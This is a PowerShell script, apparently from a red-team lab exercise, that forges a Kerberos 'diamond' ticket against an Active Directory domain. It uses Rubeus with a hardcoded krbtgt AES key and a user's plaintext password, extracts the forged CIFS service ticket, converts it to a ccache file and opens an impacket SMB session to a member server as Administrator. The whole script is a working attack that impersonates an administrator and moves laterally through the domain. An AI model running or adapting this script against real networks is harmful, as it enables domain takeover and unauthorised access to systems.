# WT012 v4: diamond full capture -> extract TGS -> ccache -> impacket smbclient -k verify
$ErrorActionPreference = 'Continue'
$rb = 'C:\Tools\ADTools\Rubeus-try4.exe'
$out = 'C:\Tools\ADTools'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$dc = 'dc02.child.cadre.local'

klist purge 2>&1 | Out-Null

Remove-Item "$out\wt012-tgt6.kirbi" -ErrorAction SilentlyContinue
& $rb asktgt /user:analyst_t1 /password:T13r_An@lyst! /domain:child.cadre.local "/dc:$dc" "/outfile:$out\wt012-tgt6.kirbi" 2>&1 | Out-Null

if (Test-Path "$out\wt012-tgt6.kirbi") {
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$out\wt012-tgt6.kirbi"))
    Write-Output "TGT_B64_LEN $($b64.Length)"

    $diamondOut = "$out\wt012-diamond6.out"
    Remove-Item $diamondOut -ErrorAction SilentlyContinue
    & $rb diamond "/ticket:$b64" "/krbtgt:$krbtgtAes" /enctype:aes /service:cifs/mbr01.child.cadre.local "/dc:$dc" /user:analyst_t1 /domain:child.cadre.local /password:T13r_An@lyst! /ptt > $diamondOut 2>&1
    Write-Output "DIAMOND_OUT_SIZE $((Get-Item $diamondOut).Length)"

    # key milestones
    Get-Content $diamondOut | Select-String -Pattern 'Action|Ticket|ServiceName|cifs|imported|KRB|error|Diamond|TGT request|Hash|Success' | Select-Object -First 25 | ForEach-Object { Write-Output "DIAM|$($_.Line)" }

    # extract the LAST base64 kirbi (the cifs TGS) from output
    $b64Lines = Get-Content $diamondOut | Where-Object { $_.Trim() -match '^[A-Za-z0-9+/=]{500,}$' }
    if ($b64Lines) {
        $lastB64 = ($b64Lines | Select-Object -Last 1).Trim()
        Write-Output "TGS_B64_LEN $($lastB64.Length)"
        # reconstruct kirbi: Rubeus wraps in blocks; join all base64 lines from the LAST block
        # better: join all lines after the 'base64(ticket.kirbi)' marker of the TGS section
        $inTgs = $false
        $joined = ''
        foreach ($l in (Get-Content $diamondOut)) {
            if ($l -match 'base64\(ticket.kirbi\)') { $inTgs = $true; continue }
            if ($inTgs) {
                $t = $l.Trim()
                if ($t -eq '') { continue }
                if ($t -match '^[A-Za-z0-9+/=]+$' -and $t.Length -gt 50) { $joined += $t }
                elseif ($joined.Length -gt 500) { break }
            }
        }
        Write-Output "JOINED_TGS_LEN $($joined.Length)"
        if ($joined.Length -gt 500) {
            $kirbi = "$out\wt012-diamond-tgs.kirbi"
            [IO.File]::WriteAllBytes($kirbi, [Convert]::FromBase64String($joined))
            Write-Output "TGS_KIRBI_SIZE $((Get-Item $kirbi).Length)"
            # ccache + impacket verify
            python "$out\kirbi2ccache.py" $kirbi "$out\wt012-diamond-tgs.ccache" 2>&1 | Select-Object -First 3 | ForEach-Object { Write-Output "K2C|$_" }
            if (Test-Path "$out\wt012-diamond-tgs.ccache") {
                $env:KRB5CCNAME = "$out\wt012-diamond-tgs.ccache"
                $smb = 'C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\smbclient.py'
                python $smb -k -no-pass -inputfile "$out\wt011-cmds.txt" 'child.cadre.local/Administrator@mbr01.child.cadre.local' 2>&1 | Select-Object -First 25 | ForEach-Object { Write-Output "SMB|$_" }
            }
        }
    }
}
klist purge 2>&1 | Out-Null
Write-Output 'WT012_V4_DONE'
